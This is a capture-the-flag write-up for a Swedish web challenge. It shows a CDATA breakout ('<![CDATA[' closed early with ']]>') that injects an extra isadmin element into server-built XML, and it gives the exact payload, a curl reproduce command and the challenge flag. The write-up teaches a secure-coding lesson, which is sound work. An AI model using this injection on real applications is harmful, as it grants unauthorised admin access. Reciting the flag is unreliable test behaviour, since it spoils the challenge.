# XML-kontroll 2

- **Category:** Web
- **Target:** `http://xmlkontroll2.challs.crate.nu/`
- **Hint:** *"Not just a check, but control!"*
- **Flag:** `cratectf{varför_skriver_jag_mitt_lösenord_så_här?}`

## Challenge
A Swedish cyber-news site ("XML-kontroll 2") with a **Settings** page (`/settings`) containing a
`name` + `country` form that POSTs `multipart/form-data`. The action URL carried a `?debug=0`
parameter.

## Recon
Flipping the debug flag to `?debug=1` makes the server echo how it builds and parses the XML.
It wraps the user input into a fixed template **inside `<![CDATA[ ... ]]>`**:

```xml
<?xml version="1.0"?>
<user>
  <isadmin>false</isadmin>
  <name><![CDATA[ <your name> ]]></name>
  <country><![CDATA[ <country> ]]></country>
</user>
```

The CDATA wrapping is meant to neutralise markup — but `]]>` closes a CDATA section, so the
input can **break out** and inject arbitrary XML. The target is the `<isadmin>` element.

## Exploit
Set the `name` field to break out of CDATA and inject a second `isadmin`:

```
]]></name><isadmin>true</isadmin><name><![CDATA[
```

Resulting parsed document (two `<isadmin>` nodes, the injected one last):

```xml
<user>
  <isadmin>false</isadmin>
  <name></name><isadmin>true</isadmin><name></name>
  <country>se</country>
</user>
```

The application reads the **last** `isadmin` element, so it now sees `true` → admin view, which
renders an unpublished draft article containing the flag (the CEO's leaked password).

### Reproduce
```bash
curl -s "http://xmlkontroll2.challs.crate.nu/settings?debug=0" \
  -F 'name=]]></name><isadmin>true</isadmin><name><![CDATA[' \
  -F 'country=se'
```

## Flag
```
cratectf{varför_skriver_jag_mitt_lösenord_så_här?}
```

## Lesson
CDATA is **not** a sanitiser — `]]>` escapes it. Never build XML by string-concatenating
untrusted input; use a real XML builder, and don't trust a privilege flag that lives in the same
client-influenced document.
